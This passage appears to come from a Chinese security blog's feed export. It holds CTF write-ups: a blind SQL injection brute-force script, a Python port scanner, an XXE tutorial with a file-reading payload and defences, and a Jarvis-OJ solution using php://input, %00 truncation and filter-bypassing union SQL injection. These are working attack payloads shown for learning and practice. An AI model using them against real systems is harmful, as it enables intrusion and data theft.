'username':"admin'^(ascii(substr((select(password)from(admin))from(%d)))&lt;&gt;%d)#"%(i,ord(j)), 'password':'1', 'submit':'Log In' &#125; r = requests.post(url,data=data) if 'password error!' in r.text: password = password + j print('the '+str(i)+' place of password is '+j) break if j == 'M' and 'username does not exist!' in r.text: breakprint(password) 我们可以看出爆出了密码，解密skctf123456。 补充一下知识点：1.ord()函数主要用来返回对应字符的ascii码 1234&gt;&gt;&gt; ord("a")97&gt;&gt;&gt; chr(97)&gt; 'a 打印字符串 print (“His name is %s”%(“Aviad”)) 效果：打印整数 print (“He is %d years old”%(25)) 效果：]]></content>
      <categories>
        <category>CTF</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python-scoket主机识别]]></title>
    <url>%2F2019%2F07%2F29%2Fpython-scoket%E4%B8%BB%E6%9C%BA%E8%AF%86%E5%88%AB%2F</url>
    <content type="text"><![CDATA[python脚本编写 1234567891011121314151617#!/usr/bin/python#coding=utf-8import socketdef portScan(ip,port): try: s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.connect(ip,port) print "%s TCP port %d is open"%(ip,port) except: print "%s TCP port %d is close"%(ip,port) finally: s.close()if __name__=="__main__": ip='192.168.19.1' port=8888888 portScan(ip,port) 1234567891011121314151617181920212223242526272829303132333435363738394041#!/usr/bin/python#coding=utf-8import socketfrom threading import Threadfrom optparse import OptionParserdef portScan(ip,port): try: c=socket.socket(socket.AF_INET,socket.SOCK_STREAM) c.connect((ip,port)) print "%s TCP port %d is open"%(ip,port) except: print "%s TCP port %d is closed"%(ip,port) finally: c.close()if __name__=="__main__": parser=OptionParser('usage: %prog -i &lt;target host&gt; -n &lt;network&gt; -p &lt;target port&gt;') parser.add_option('-i',type='string',dest='tgtIP',help='specify target host') parser.add_option('-n',type='string',dest='tgtnetwork',help='specify target network') parser.add_option('-p',type='string',dest='tgtport',help='specify target port') (options,args)=parser.parse_args() tgtIP=options.tgtIP tgtnetwork=options.tgtnetwork tgtport=options.tgtport if (tgtport == None or tgtIP==None and tgtnetwork==None): print parser.usage exit(0) tgtport=tgtport.split(',') if tgtIP: for p in tgtport: portScan(tgtIP,int(p)) if tgtnetwork: ip=tgtnetwork.split('.')[0] + '.' +tgtnetwork.split('.')[1] + '.' +tgtnetwork.split('.')[2] + '.' for i in range(1,255): try: IP=ip + str(i) for p in tgtport: t=Thread(target=portScan,args=(IP,int(p))) t.start() except KeyboardInterrupt: exit()]]></content>
      <categories>
        <category>PYTHON</category>
        <category>信息收集脚本</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[xxe漏洞详解]]></title>
    <url>%2F2019%2F07%2F29%2Fxxe%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。 基础知识 XML基础知识XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。—-看了之后是不是很牛逼？高大上？其实百分之99的人看不懂。下面来点通俗的讲解： 简单概括的话就是，xml本身是一种格式规范，是一种包含了数据以及数据说明的文本格式规范。比如，我们要给对方传输一段数据，数据内容是“too young,too simple,sometimes naive”，要将这段话按照属性拆分为三个数据的话，就是，年龄too young，阅历too simple，结果sometimes naive。 我们都知道程序不像人，可以体会字面意思，并自动拆分出数据，因此，我们需要帮助程序做拆分，因此出现了各种各样的数据格式以及拆分方式。比如，可以是这样的数据为“too young,too simple,sometimes naive”然后按照逗号拆分，第一部分为年龄，第二部分为阅历，第三部分为结果。也可以是这样的数据为“too_young**too_simple*sometimes_naive”从数据开头开始截取前面十一个字符，去掉*号并把下划线替换为空格作为第一部分，再截取接下来的十一个字符同样去掉*并替换下划线为空格作为第二部分，最后把剩下的字符同样去*号体会空格作为第三部分。 这两种方式都可以用来容纳数据并能够被解析，但是不直观，通用性也不好，而且如果出现超过限定字数的字符串就容纳不了，也可能出现数据本身就下划线字符导致需要做转义。基于这种情况，出现了xml这种数据格式， 上面的数据用XML表示的话可以是这样 1234567&lt;person age="too young" experience="too simple" result="sometimes naive" /&gt;也可以是这样&lt;person&gt; &lt;age value="too young" /&gt; &lt;experience value="too simple" /&gt; &lt;result value="sometimes naive" /&gt;&lt;/person&gt; 两种方式都是xml，都很直观，附带了对数据的说明，并且具备通用的格式规范可以让程序做解析。如果用json格式来表示的话，就是下面这样{ “age”:”too young”, “experience”:”too simple”, “result”:”sometimes naive”}其实数据都是一样的，不同的只是数据的格式而已，同样的数据，我用xml格式传给你，你用xml格式解析出三个数据，用json格式传给你，你就用json格式解析出三个数据，还可以我本地保存的是xml格式的数据，我自己先解析出三个数据，然后构造成json格式传给你，你解析json格式，获得三个数据，再自己构造成xml格式保存起来，说白了，不管是xml还是json，都只是包装数据的不同格式而已，重要的是其中含有的数据，而不是包装的格式。 DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。内部声明DTD 根元素 [元素声明]&gt; 引用外部DTD 根元素 SYSTEM “文件名”&gt;或者根元素 PUBLIC “public_ID” “文件名”&gt;** //注意文件包含漏洞 DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。 内部声明实体 实体名称 “实体的值”&gt; 引用外部实体实体 名称 SYSTEM “URI”&gt; //注意ssrf漏洞 或者 实体名称 PUBLIC “public_ID” “URI”&gt; DTD基础知识在信息的高速交流中，不同领域之间的信息交换越来越紧密，如何才能保证这些不同领域之间的信息可以更容易且更有效率地交换成为我们首要关注的问题。为了解决这个问题，就需要不同的领域来针对领域的特性制定共同的信息内容模型（content model），然后再通过这个共同的内容模型来标识信息。而DTD就是一种内容模型。 DTD（文档类型定义）可以定义合法的XML文档结构，它使用一系列合法元素来定义文档的结构。DTD分为内部DTD和外部DTD，所谓内部DTD是指该DTD在某个文档的内部，只被该文档使用。外部DTD是指该DTD不在文档内部，可以被其他所有的文档来共享。DTD文档与XML文档实例的关系可以看成是类和对象的关系。 DTD的优势 每一个XML文档都可携带一个DTD，用来对该文档格式进行描述，测试该文档是否为有效的XML文档。既然DTD有外部和内部之分，当然就可以为某个独立的团体定义一个公用的外部DTD，那么多个XML文档就都可以共享使用该DTD，使得数据交换更为有效。甚至在某些文档中还可以使内部DTD和外部DTD相结合。在应用程序中也可以用某个DTD来检测接收到的数据是否符合某个标准。 对于XML文档而言，虽然DTD不是必须的，但它为文档的编制带来了方便。加强了文档标记内参数的一致性，使XML语法分析器能够确认文档。如果不使用DTD来对XML文档进行定义，那么XML语法分析器将无法对该文档进行确认。举个例子： 1234567&lt;stu id="a&amp;quot;0&amp;apos;0&amp;apos;1&amp;lt;" &gt;&lt;name&gt;杨过&lt;/name&gt;&lt;sex&gt;男&lt;/sex&gt;&lt;age&gt;30&lt;/age&gt;&lt;介绍&gt;我是好人&lt;/介绍&gt;&lt;面积&gt;100平&lt;/面积&gt;&lt;/stu&gt; xml过于自由。快速入门案例基本语法是: 123456789101112131415&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!--引入dtd去约束该xml文件--&gt;&lt;!DOCTYPE 班级 SYSTEM "myClass2.dtd"&gt;&lt;班级&gt; &lt;学生&gt; &lt;名字&gt;周星驰&lt;/名字&gt; &lt;年龄&gt;23&lt;/年龄&gt; &lt;介绍&gt;学习刻苦&lt;/介绍&gt; &lt;/学生&gt; &lt;学生&gt; &lt;名字&gt;林青霞&lt;/名字&gt; &lt;年龄&gt;32&lt;/年龄&gt; &lt;介绍&gt;是一个好学生&lt;/介绍&gt; &lt;/学生&gt;&lt;/班级&gt; 123456myClass2.dtd&lt;!ELEMENT 班级 (学生+)&gt;&lt;!ELEMENT 学生 (名字,年龄,介绍)&gt;&lt;!ELEMENT 名字 (#PCDATA)&gt;&lt;!ELEMENT 年龄 (#PCDATA)&gt;&lt;!ELEMENT 介绍 (#PCDATA)&gt; 漏洞利用 XML外部实体注入(XML External Entity)当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。 引入外部实体方式有多种，比如：恶意引入外部实体方式1：XML内容：恶意引入外部实体方式2：XML内容：DTD文件(evil.dtd)内容：恶意引入外部实体方式3：XML内容：DTD文件(evil.dtd)内容：另外，不同程序支持的协议不一样，上图是默认支持协议，还可以支持其他，如PHP支持的扩展协议有 12&lt;?xml version="1.0" standalone="no"?&gt;&lt;!DOCTYPE root SYSTEM "http://www.test.org/test.dtd"&gt; 对于以上的一些代码我们做一些解释：DOCTYPE分析DTD声明始终以!DOCTYPE开头,空一格后跟着文档根元素的名称,如果是内部DTD,则再空一格出现[],在中括号中是文档类型定义的内容. 而对于外部DTD,则又分为私有DTD与公共DTD,私有DTD使用SYSTEM表示,接着是外部DTD的URL. 而公共DTD则使用PUBLIC,接着是DTD公共名称,接着是DTD的URL.下面是一些示例公共DTD,DTD名称格式为”注册//组织//类型 标签//语言”,”注册”指示组织是否由国际标准化组织(ISO)注册,+表示是,-表示不是.”组织”即组织名称,如:W3C; “类型”一般是DTD,”标签”是指定公开文本描述，即对所引用的公开文本的唯一描述性名称,后面可附带版本号。最后”语言”是DTD语言的ISO 639语言标识符,如:EN表示英文,ZH表示中文,在下面的地址有完整的ISO 639语言标识符列表[url]http://ftp.ics.uci.edu/pub/ietf/http/related/iso639.txt [/url] 以下举例说明XXE危害，当然XXE不止这些危害。XXE危害1：读取任意文件 该CASE是读取/etc/passwd，有些XML解析库支持列目录，攻击者通过列目录、读文件，获取帐号密码后进一步攻击，如读取tomcat-users.xml得到帐号密码后登录tomcat的manager部署webshell。 另外，数据不回显就没有问题了吗？如下图， 不，可以把数据发送到远程服务器，远程evil.dtd文件内容如下：触发XXE攻击后，服务器会把文件内容发送到攻击者网站 XXE危害2：执行系统命令 该CASE是在安装expect扩展的PHP环境里执行系统命令，其他协议也有可能可以执行系统命令。 XXE危害3：探测内网端口 该CASE是探测192.168.1.1的80、81端口，通过返回的“Connection refused”可以知道该81端口是closed的，而80端口是open的。 XXE危害4：攻击内网网站该CASE是攻击内网struts2网站，远程执行系统命令。 客户端XXE案例日前，某office文档转换软件被爆存在XXE漏洞（PS:感谢TSRC平台白帽子Titans)报告告漏洞），某一应用场景为：Web程序调用该office软件来获取office文档内容后提供在线预览。由于该软件在处理office文档时，读取xml文件且允许引用外部实体，当用户上传恶意文档并预览时触发XXE攻击。详情如下：新建一个正常文档，内容为Hi TSRC， 使用该软件转换后可以得到文本格式的文档内容， 当往该docx的xml文件注入恶意代码（引用外部实体）时，可进行XXE攻击。 防御XXE攻击 方案一、使用开发语言提供的禁用外部实体的方法PHP：libxml_disable_entity_loader(true); 其他语言:https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet 方案二、过滤用户提交的XML数据 关键词：，SYSTEM和PUBLIC。]]></content>
      <categories>
        <category>漏洞原理</category>
        <category>xxe漏洞</category>
      </categories>
      <tags>
        <tag>杂谈</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Jarvis-OJ-api调用]]></title>
    <url>%2F2019%2F07%2F29%2FJarvis-OJ-api%E8%B0%83%E7%94%A8%2F</url>
    <content type="text"><![CDATA[面对这道题我完全小白，所以我必须详细解释。 基础知识 什么是php框架？框架思想就是提供一种可以在多个应用程序中使用的设计。所有应用程序都有大量通用的基本内容 —— 具体地说，就是某类与数据库的接口、某些应用程序逻辑、应用程序呈现给用户的内容等。如果您编写过许多 PHP 应用程序，则会知道这些基本内容是什么。您可能已经编写过一组函数或从数据库中读取数据和向数据库中写入数据的类，可能已经使用过诸如 Smarty 之类的模板引擎来管理 UI。而且一定编写过大量 PHP 代码来完成诸如分析表单提交并根据提交的数据作决定之类的事务。如果您已经编写过很多应用程序，则可能已经一次又一次地做过相同的基本工作，有时还会将一个应用程序中的代码借用到另一个应用程序中。 框架专门用于为这些常用元素(数据库交互、表示层、应用程序逻辑)提供结构，以便您可以花费更少的时间来编写数据库接口代码或者表示层接口，而花费更多的时间来编写应用程序本身。以这种方式分解应用程序，这种架构被称为模型-视图-控制器(Model-View-Controller，MVC)。模型 指数据，视图 指表示层，而控制器 指应用程序逻辑或业务逻辑。对 MVC 的完整讨论超出本文的范围，但是鼓励您研究 MVC 并深入了解 MVC 的一切(请参阅 参考资料)。 选择框架 每种语言几乎都有若干个框架可用。选择刚好满足需求的框架可能有点难，尤其是当您以前未曾使用过任何一个框架时更是如此。虽然熟悉此领域的同事和可信赖的 developerWorks 作者提供的建议和评价会十分有帮助，但是选择任何框架时实际上应当遵循的惟一一个指导原则是：框架为每个人 节省的时间和精力越多越好。如果一个框架工作得很好但是会导致产生大量支持调用，那就不是一个优秀框架。如果一个框架易于支持，但是起到的阻碍作用大于辅助开发作用，那也不是一个优秀框架。如果一个框架十分优雅，但是会导致出现支持问题和开发问题，那么这个框架也是没有用的。 选择项目框架时，考虑从上到下所有相关人员的意见，并且在评估框架时，考虑到对其他各方的影响。 当考虑采用一个框架时，请进一步审视您的应用程序，并思考该应用程序是不是需要一个框架。框架不是必需品。即使不使用框架，也可以继续编写企业应用程序。框架会对项目有帮助么?它是否会节省每个人的时间和精力?您的应用程序在框架中是否会执行得更好?它是否将提供所缺乏的稳定性?如果上面任意一个问题的答案为是，那么您应当考虑采用框架。如果所有这些问题的答案都为否，那么使用框架只会把事情变复杂。 什么是api？从文件操作开始谈API。以C语言为例，我们使用fopen()函数可以打开一个文件，感觉非常简单。文件保存在硬盘上，要经过复杂的处理才能显示，这些细节对我们来说是透明的，由操作系统完成。也就是说，我们调用fopen()函数来通知操作系统，让操作系统打开一个文件。那么，我们如何告诉操作系统打开文件呢？ 看似简单的操作到底层都非常复杂，打开文件首先要扫描硬盘，找到文件的位置，然后从文件中读取一部分数据，将数据放进I/O缓冲区，放进内存；这些数据都是0、1序列，还要对照ASCII表或Unicode表”翻译“成字符，再在显示器上显示出来。这个过程如果要让程序员来完成，那简直是噩梦！怎么办呢？操作系统想了一个很好的办法，它预先把这些复杂的操作写在一个函数里面，编译成一个组件（一般是动态链接库），随操作系统一起发布，并配上说明文档，程序员只需要简单地调用这些函数就可以完成复杂的工作，让编程变得简单有趣。这些封装好的函数，就叫做API(Application Programming Interface)，即应用程序编程接口。说得更加通俗易懂一些，别人写好的代码，或者编译好的程序，提供给你使用，就叫做API。你使用了别人代码（或者程序）中的某个函数、类、对象，就叫做使用了某个API。 各种编程语言自带的标准库其实也是API。这些API由编程语言的开发者们编写，安全、高效、健壮，为我们实现了常见的功能，让我们不用再重复造轮子。C语言 API 以函数的形式呈现，例如 printf()、scanf()、fopen() 等。Java API 主要以类的形式呈现，例如 String、Thread、Date 等。C++ 是在C语言的基础上进行的扩展，所以 C++ API 既包含函数也包含类。第三方库（框架）libxml2——xml的c语言版库，2个项目使用过，win和Linux下都很犀利~~比较快捷CURL—— 这个用的主要是使用了他的封装的http和https的请求，比较犀利，其中包含了openssl的内容iconv——功能强大的编码格式转化库，UTF8，Unicode等互相转化很方便openssl——C的开源密库，可以进行证书加密和https的访问的模拟提交可以和CURL配合使用cocos2d——2D游戏引擎，相比较传统的UI自己控制的重画OpenCV——开源图像库还有很多第三方（非官方）的组织机构、公司、个人提供的代码，也是一种 API。这些代码有的免费，有的收费；有的开源，有的闭源。这些代码大都针对某个特定的应用领域编写，有时候被称为框架或者库。例如基于C语言的图形界面库GTK，基于C++的网络库ACE，基于Java的大数据处理平台Hadoop，基于Python的Web开发框架Django，基于JavaScript的前端开发框架React。严格的来说, API 代表：应用程序编程接口，在某些或其他方面，很多大型公司会建立自己的API提供给用户或者内部使用。不过怎么用通俗的语言向你解释什么是API呢，在开发和业务中他是不是更多的含义呢，让我们后退一步看看网络是如何工作的。严格的来说, API 代表：应用程序编程接口，在某些或其他方面，很多大型公司会建立自己的API提供给用户或者内部使用。不过怎么用通俗的语言向你解释什么是API呢，在开发和业务中他是不是更多的含义呢，让我们后退一步看看网络是如何工作的。 www和远程服务器当我想到网络的时候，我脑海中想象了一张巨大的连接服务网络每一张页面都储存在远程服务器中，而一个远程服务器并不是那么的神秘，他就是一部分用来优化请求过程的远程计算机。为了能让事情更透明，你可以在你一台可以服务整个网站到网络上的手提电脑上启动一个服务器（事实上，一个本地服务器就是在发布到公众上之前工程师需要开发网站：注：其实这句话我不是很理解，翻译得乱七八糟，原文是：a local server is what engineers use to develop websites before releasing them to the public）。当你键入www.facebook.com进入你的浏览器并回车的时候，一个请求就去到了faceboook的远程服务器。一旦你的浏览器接收到了响应，它就解析代码并展示页面。浏览器，也就是我们说的客户端 ，也可以不太严谨的说facebook的服务器就是个API ，这意味这每次你在网络上浏览网页的时候，你就和一些远程服务器的API发生了交互。一个API并不是等同于一整个远程服务器，他是服务器用来接受请求和发送响应的一部分 API就是一种为你客户提供服务的方法你可能听说过公司将API包做成一个产品，例如，”地下气象站“出售的就是它自己的气象数据API的 入口实例场景： 你的个人小型商业网站有一个给客户注册的预约表格，你想要给你的客户提供自动创建一个谷歌日历时间的能力。API 使用：这概念就是让你的网站服务器带着请求去创建一个具体的事件，你的服务器之后会接收到谷歌的响应，处理它，然后将有关信息发送回给你的浏览器，例如发送一个认证信息给你的用户。另外，你的浏览器会通过你的服务器经常直接发送API 请求到谷歌服务器。谷歌日历的API 和其他的远程服务器的API 究竟有什么不同。专业的说，不同之处在于他们的请求和响应的形式是不一样的。当你提交整个页面的时候，你的浏览器期待的是一种HTML格式的响应，这个响应里包含了一些描述性的代码，当谷歌日历API 响应的时候会返回一些数据，大多是类似与json的格式。如果你的网站服务器发出了个API 请求，那么你的网站服务器就变成了个客户端（类似与当你使用浏览器访问网站的时候你的浏览器就成了客户端一样），从用户的角度来说，API允许他们完成一些没有离开网站的动作。很多现代的网站都至少使用了一些第三方API。很多问题都有了第三方的解决方案了，无论是以函数库或者是服务的形式，使用第三方的解决方案现在已经逐渐变得更简单和更可靠。这是很常见的，开发团队将他们的应用分解到多个服务器里面，服务器通过API 相互交流。为主应用服务器提供辅助功能的服务器这方面的知识可以参考微型服务器。总得来说，当一个公司向它的用户提供了API 的时候，这就意味着他们建造了一系列的专用URL通道，用来返回纯数据形式的响应，意味这响应不会包含一些用于解释的额外开销，你期望的是一种像网站一样的图表用户界面。你的浏览器可以发送这种请求吗，当然可以，由于实际的HTTP传输都是以文本的形式进行的，你的浏览器总是能达到它能展示响应的最好状态。例如，你可以通过浏览器直接访问GitHub的API ，甚至根本不需要访问标记（=_= # 什么是访问标记…..)，当你用浏览器访问一个GitHub的用户API的时候，你将获得一个JSON形式的响应 A就是application作为结束，就多扔几个关于API 的事例吧“应用”可以指很多事情，在API 里面他指代的是： 1 :一个具有不同功能的软件 2：整个服务器，整个app，或者是app的一小部分基本上任何软件都可以从环境中有区别的分离开来，有可能在API 里成为A（也就是Application），也可能它本身就是某种API。假设你在你的代码里使用了第三方的函数库，一旦与你的代码结合了，一个函数路就成为了你真个APP里的一部分，成为软件中特殊的一部分，函数库很可能具有一个让你可以与你其他的代码相互沟通的API .这有其他的一些例子，在面对对象设计中，代码是被组织进对象的，你的应用程序可能是由上百个可以相互交流的类构成的,每个类都有一个API ，一系列公共方法和用于和其他类进行交流的的属性,一个类可能有内部的私有化属性，这意味这它是对外部环境隐藏的（不是一个API ）,在使用API 这个东西越来越普遍的今天，希望你看完本篇文章后会有更多的理解 JSONJSON(JavaScript Object Notation, JS 对象简谱) 是一种轻量级的数据交换格式。它基于 ECMAScript (欧洲计算机协会制定的js规范)的一个子集，采用完全独立于编程语言的文本格式来存储和表示数据。简洁和清晰的层次结构使得 JSON 成为理想的数据交换语言。 易于人阅读和编写，同时也易于机器解析和生成，并有效地提升网络传输效率 xxe漏洞详解此部分在我的博客有详细解说,一定要先看看去看 解题步骤 我们一开始看到一个登陆框，输入没什么反省，只是回显字段，后来我们抓包也没什么反映，但是我们在输入参数之后进行抓包，出现反映了。我们可以看到回显信息是json格式，而且content-type为application/json。application即为应用，api简称是啥应用程序编程接口，题目是啥api调用emmmmmmmm有点关系了。 关于content-type MediaType，即是Internet Media Type，互联网媒体类型；也叫做MIME类型，在Http协议消息头中，使用Content-Type来表示具体请求中的媒体类型信息。 常见的媒体格式类型如下：text/html ： HTML格式text/plain ：纯文本格式text/xml ： XML格式image/gif ：gif图片格式image/jpeg ：jpg图片格式image/png：png图片格式以application开头的媒体格式类型：application/xhtml+xml ：XHTML格式application/xml ： XML数据格式application/atom+xml ：Atom XML聚合格式application/json ： JSON数据格式application/pdf ：pdf格式application/msword ： Word文档格式application/octet-stream ： 二进制流数据（如常见的文件下载） 题目表述：请设法获得目标机器/home/ctf/flag.txt中的flag值。题目还出现了json，而且我们可以看到我们传入的数据以另一种的形式出现在下面，可以修改。这里使我们想到了xml，与xml相关的漏洞是什么？xee，xee原理我们已经了解过了所以我们开始获取flag。XXE漏洞就是服务器接受从客户端发送来的xml格式数据时，xml数据中恶意的引用了外部实体，将它的值绑定为服务器的目标文件，这样在服务器返回给我们解析后的值时，就会把目标文件的内容返回给我们，我们就读取了敏感文件。 但是这道题目，默认的是json格式传递，因此首先我们更改Content-Type的值为application/xml,然后传入xml代码： 12345&lt;?xml version=”1.0″?&gt;&lt;!DOCTYPE abcd[&lt;!ENTITY any SYSTEM "file:///home/ctf/flag.txt"&gt;]&gt;&lt;something&gt;&amp;any;&lt;/something&gt;]]></content>
      <categories>
        <category>CTF</category>
        <category>Jarvis-OJ</category>
      </categories>
      <tags>
        <tag>Jarvis-OJ</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Jarvis OJ IN A Mess]]></title>
    <url>%2F2019%2F07%2F27%2FJarvis-OJ-IN-A-Mess%2F</url>
    <content type="text"><![CDATA[查看源码发现index.phps文件，打开开始代码审计 1234567891011121314151617181920212223242526&lt;?phpif(!$_GET['id'])&#123; header('Location: index.php?id=1'); exit();&#125;$id=$_GET['id'];$a=$_GET['a'];$b=$_GET['b'];if(stripos($a,'.'))&#123; echo 'Hahahahahaha'; return ;&#125;$data = @file_get_contents($a,'r');if($data=="1112 is a nice lab!" and $id==0 and strlen($b)&gt;5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)&#123; require("flag.txt");&#125;else&#123; print "work harder!harder!harder!";&#125;?&gt; 代码解释：1.判断id参数存不存在，如果不存在跳转到index.php?id=12.获取三个变量id，a，b3.判断a变量中有没有’.’4.打开文件a,并且放到字符串r中5.1)data变量等于一个字符串2)id=03)b变量的长度大于54)ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的。eregi函数对大小写不敏感。6.file_get_contents 函数返回字符串的结果，可以赋值给变量，也可以直接进行使用：返回结果直接使用的例子代码：echo file_get_contents(‘a.txt’);此语句直接显示a.txt的文件内容返回结果赋值给变量的例子代码：$s=file_get_contents(‘a.txt’);接下来可以对字符串变量$s进行使用，例如获取部分内容。 @符号用来屏蔽错误信息，当函数不存在或者包含文件不存在时，不会显示错误信息。 eregi存在%00截断，而substr没有，也就是说eregi如果第一个字符是%00，那它就跳过这个再检测。 123456789&lt; ?php if (ereg("c","abcdef"))&#123; //说明：判断abcdef中是否含有字母c echo "通过"; &#125;else&#123; echo "错误"; &#125; ?&gt; eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) 他的意思就是判断某个字符串中是否有1114，这个某个字符串就是111加上b的第一个字符。这个条件很容易满足，但是问题就在后面，它又要求b的第一个字符不等于四。前后矛盾啊。在这里我们使用00截断而且变量a的值是一个文件，不是一个字符串。因此我们就不能将对应的字符串传递给a，使得data为对应的字符串。在这里我们使用php伪协议。那么php伪协议到底什么呢？php://input 是个可以访问请求的原始数据的只读流。，我们的变量a必须是一个文件名字，但是我们总不能在部署服务器上搭建一个文件，所以这个协议在这里充当的作用就是一个衔接的作用，我们以post方式传递参数。id的值很显然不能为0，但是我们可以利用弱等于。那我们就开始构造payload：长度大于5其中有1114但是第四个不等等于4 http://web.jarvisoj.com:32780/index.php?id=a&amp;a=php://input&amp;b=%0041114竟然不出flag，给了一串字符。不是加密、、、也不是flag、、、前面有个/有点像目录呀，试试呗。后面有个id，可能是sql注入？加个单引号’判断列但是无论多少列都是一样的回显，肯定过滤了什么，我们试试过没过滤空格,在下面的步骤中我们试过了没有过滤order by,但是为什么这里是sql防御回显,肯定是过滤了空格。 既然这样那么我们就开始苦逼的sql注入之路吧 一开始是各种猛操作啊，但是屁用没有，正常的思路就是应该判断过滤了什么，但是我嫌麻烦。。。返回头来还是老老实实的看过滤什么字符吧，一开始我想到了burp的模糊测试，但是太麻烦了分post和get，我在网上只找到了post的方法。最后用到了我以前学习的小技巧。web.jarvisoj.com:32780/^HT2mCpcvOLf/index.php?id=1&#39;^(length(select)=0)select被过滤掉了。接着我们就换其他的测试，在这里想测谁的就测谁的哈哈哈哈哈哈哈哈哈哈。但是被过滤了我们不要忘记绕过方法。比如双写http://web.jarvisoj.com:32780/%5EHT2mCpcvOLf/index.php?id=1%27^(length(selecselectt)=0)最后我我们得到的结果：被过滤：selectfrom没有被过滤：andwhereor/2//#(为了避免笔记对应的操作这里加一个/)information‘orderby我在测试空格的时候，竟然爆错了，说明空格不但被过滤了而且。。。还被限制了。/**/ 竟然也被限制了emmm太毒了。–+也被限制了但是#没有哈哈哈哈哈哈哈哈哈哈 这题很狗啊，双写绕过必须穿插，不能是selectselect. 真正的注入即将开始http://web.jarvisoj.com:32780/%5EHT2mCpcvOLf/index.php?id=1/*1*/or/*1*/1=1#http://web.jarvisoj.com:32780/%5EHT2mCpcvOLf/index.php?id=1/*1*/order/*1*/by/*1*/3#三个字段。回显正常。4个字段回显不正常 http://web.jarvisoj.com:32780/%5EHT2mCpcvOLf/index.php?id=-1/*1*/uniounionn/*1*/selecselectt/*1*/1,2,group_concat(column_name)/*1*/frofromm/*1*/information_schema.columns/*1*/where/*1*/table_name=0x636F6E74656E74#http://web.jarvisoj.com:32780/%5EHT2mCpcvOLf/index.php?id=-1/*1*/uniounionn/*1*/selecselectt/*1*/1,2,context/*1*/ffromrom/*1*/content# flag得到了，那么我们现在就来总结一下吧。首先，我们正常思路，单引号、order by、union、select。在这里我们一定要主要我们每次输入语句的时候页面给我们回显的是什么，在这个题中我们输入单引号报错，页面给我们回显。其实当我们使用or 1=1#的时候按理来说应该跟id=1的情况回显一样，但是这个题过滤或者限制了某个字符，我们在使用的时候肯定是报错或者出现固定的提示。我们使用没有过滤的字符：可以看到与id=1的时候回显一样。我在不断的错误中发现了三种情况：1.正常回显2.错误回显，这里指的是我们输入的sql语句错误或者没有正确闭合(也就是报错)3.sql防御回显，这里指的是后端如果检测到它所指定的危险字段，会给我们回显固定的语句或者提示(这里要与二区别开来)]]></content>
      <categories>
        <category>CTF</category>
        <category>Jarvis-OJ</category>
      </categories>
      <tags>
        <tag>Jarvis OJ wp</tag>
      </tags>
  </entry>
</search>
